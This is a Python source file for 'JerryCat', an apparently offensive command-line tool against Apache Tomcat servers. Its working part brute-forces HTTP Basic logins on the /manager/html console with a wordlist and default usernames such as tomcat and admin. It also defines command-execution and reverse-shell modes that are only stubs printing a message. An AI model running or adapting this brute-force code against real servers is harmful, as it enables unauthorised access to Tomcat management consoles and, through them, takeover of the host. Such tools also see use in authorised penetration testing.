import argparse
import sys
import time

import requests
from requests.auth import HTTPBasicAuth

from termcolor import *
from rich.progress import (
    BarColumn,
    MofNCompleteColumn,
    Progress,
    TextColumn,
    TimeElapsedColumn,
    TimeRemainingColumn,
)

global args
global output

# progress_bar object - serve as a model
progress_bar = Progress(
    "{task.description}",
    TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
    BarColumn(),
    MofNCompleteColumn(),
    TextColumn("•"),
    TimeElapsedColumn(),
    TextColumn("•"),
    TimeRemainingColumn(),
)

# common username list of tomcat's most common username - serve as backup if no user list
common_username: list[str] = [
    "tomcat",
    "manager",
    "role1",
    "root",
    "admin"
]


# TODO : Make a class for output statement [+], [-], like output.success("description of the output")
class output_class:
    def __init__(self):
        self.description = ""

    def message(self, state: str, description: str, clear_previous_line: bool) -> None:
        self.description = description

        if clear_previous_line:
            sys.stdout.write("\033[F")  # back to previous line
            sys.stdout.write("\033[K")  # clear line

        match state:
            case "success":
                cprint("[+] ", "green", end="")
            case "failed":
                cprint("[-] ", "red", end="")
            case "error":
                cprint("[!] ", "yellow", end="")
            case "ongoing":
                cprint("[*] ", "blue", end="")

        print(self.description)

    def verbose(self, state: str, description: str, clear_previous_line: bool) -> None:
        if args.verbose:
            self.message(state, description, clear_previous_line)


# Brute force mode function
def brute(url: str, userlist: str, wordlist: str) -> tuple[str, str] | bool:
    if userlist is None:
        userlist = common_username
    else:
        with open(userlist, 'r') as file:
            userlist = file.read().splitlines()

    # without user list
    with open(wordlist, "r", encoding="utf-8", errors="ignore") as open_wordlist:

        length_wordlist = len(open_wordlist.readlines())

        with Progress(*progress_bar.columns, transient=True) as progress:
            task = progress.add_task(description="[violet] Brute force...",
                                     total=length_wordlist * len(userlist))

            for username in userlist:
                # Reset file pointer to the beginning
                open_wordlist.seek(0)

                for password in open_wordlist:
                    password = password.strip()  # remove space or bad space
                    auth = HTTPBasicAuth(username, password)
                    response = requests.get(f"{url}/manager/html", auth=auth)

                    # TODO : add an option --continue-on-success
                    if response.status_code == 200:
                        output.verbose(state="success", description=f"{username}:{password}", clear_previous_line=False)
                        progress.update(task, completed=length_wordlist * len(userlist))
                        time.sleep(1)
                        return username, password
                    else:
                        output.verbose(state="failed", description=f"{username}:{password}", clear_previous_line=False)
                        progress.advance(task)

    # if not found return False statement
    return False


def banner() -> str:
    return '''
    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠞⢛⣩⡽⠿⠛⠛⠷⣄⠀⠀
⠀⡷⢶⣶⡶⠶⠤⠤⢤⣄⣀⣀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠈⠙⢿⣶⣄⠀⠀⠀⠀⠀⠀⢀⣴⠟⢉⣤⠾⠋⠁⠀⠀⠀⠀⠀⠘⣷⠀
⠀ ⠀⠈⠻⢶⣄⠀⠀⠀⠀⠉⠉⠛⠲⠦⣤⣀⠀⠉⠙⠻⢶⣦⣍⣻⣿⣦⡀⠀⢀⣴⠟⢁⡴⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇
⠀⠀⠀⠀⠀⠀⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢲⣤⣀⣀⣈⣻⣿⣿⠎⠻⣤⠟⠁⣰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣄⠀⠀⢀⣠⡴⠶⠛⠋⠉⠉⠁⠀⠀⠀⠀⠀⠀⣰⠏⠀⣸⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⡾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⠀⢀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⢀⣠⠀⠀⠀⠀⠀⠀⠀⢰⠃
⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣾⣀⣀⣀⣤⠟⠃⠀⠀⠀⠀⠀⠀⢠⡏⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠶⠛⠛⠻⠂⠀⠀⠀⠀⠀⠈⢉⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢻⡿⣶⣄⠀⠀⠀⠀⠀⠀⢠⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠈⠛⠀⢰⡄⣶⠀⠀⠀⢀⣤⣶⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⣀⠈⢿⣤⣀⣀⣀⣀⣤⠞⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡶⢦⣄⡈⣷⣿⣀⣠⠶⠋⠻⠿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⣦⠬⠽⠟⠛⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠤⢴⠤⣤⣄⣀⣀⣴⣿⠛⠻⢦⣹⢿⣿⣿⣿⣿⣄⠀⢀⣰⠇⠀⣀⣀⣀⣤⣤⠤⠴⠶⠶⢶⠟⠒⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀  ⠀⠀⠀⢸⣿⣿⣿⣿⣾⣿⡿⢿⡿⠛⢠⣬⣿⣿⣿⣿⣯⣭⣭⣤⣤⣤⣤⣴⣤⣴⣏⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠸⠋⠉⠉⠉⠉⠙⢿⣿⣿⣷⣬⣷⡈⣧⣄⣀⠹⣧⠀⠀⡟⢹⣦⣄⣴⡟⠁⢀⣀⣀⠙⢦⡀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣼⠋⠉⠉⠛⣿⠿⣯⣿⣯⣗⣼⣷⣦⣿⣿⡿⠿⠾⠿⠿⠭⣍⣉⡉⠛⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⡁⠀⠀⠀⢠⡏⢀⡴⠋⠁⠀⠀⠀⢈⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⢦⣸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⠃⠀⠀⣠⡾⣷⠏⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢿⠷⠤⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠸⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⡼⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⢰⣷⠃⠀⠀⠀⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠉⠙⠒⠒⠒⠒⠒⠒⠒⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠁⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⢰⠃⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

                                                  JerryCat By Anh4ckin3 & Talace

'''


def main():
    global output, args

    parser = argparse.ArgumentParser(description="jerrycat the good guy !")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-v", "--verbose", action="store_true", default=False)

    # choose mode
    parser.add_argument("mode", choices=["brute", "exec", "reverse"],
                        help="Mode: bruteforce, command, or reverse shell")

    # TODO : See if we need to update this option below because -U is already an option? (like --host --ip)
    parser.add_argument('-u', '--url', dest='url', help='url of the tomcat app')

    # Brute mode
    brute_mode = parser.add_argument_group("Brute Options")
    parser.add_argument('-w', '--wordlist', dest='wordlist', help='path on your own wordlist')
    parser.add_argument('-l', '--user-list', dest='userlist', help='User list ( default tomcat )')

    # exec mode
    exec_mode = parser.add_argument_group("Command execution Options")
    parser.add_argument('-U', '--user', dest='user', help='tomcat user')
    parser.add_argument('-p', '--password', dest='password', help='tomcat user password')

    # reverse shell mode
    reverse_mode = parser.add_argument_group("reverse shell Options")
    reverse_mode.add_argument('-R', '--reverse', dest='reverse', help='path to your reverse shell payload')

    args = parser.parse_args()

    # instance new class
    output = output_class()

    # settings for brute mode
    if args.mode == "brute":
        if not all([args.url, args.wordlist]):
            parser.error(" -u and -w arguments are requires for this mode.")
        else:
            print(banner())
            cprint("[+]", "green", end="")
            print(" Mode Brute selected")
            url = args.url
            userlist = args.userlist
            passwords = args.wordlist
            cprint("[*]", "blue", end="")
            print(' Brute force is running...')
            credentials_found = brute(url, userlist, passwords)

            # sys.stdout.write("\033[F")  # back to previous line
            # sys.stdout.write("\033[K")  # clear line

            if not credentials_found:
                output.message("failed", f"No user or password is matching ! :(", False)
            else:
                output.message("success", f"Find user and password : {credentials_found[0]}:{credentials_found[1]}",False)

                # settings for exec mode
    elif args.mode == "exec":
        if not all([args.url, args.user, args.password]):
            parser.error("-u, -U, -p arguments are requires for this mode.")
        else:
            print("Command execution mode selected")

    # settings for reverse mode
    elif args.mode == "reverse":
        if not all([args.url, args.user, args.password, args.reverse]):
            parser.error("-u, -U, -p arguments are requires for this mode.")
        else:
            print("Reverse shell mode selected")


if __name__ == "__main__":
    main()
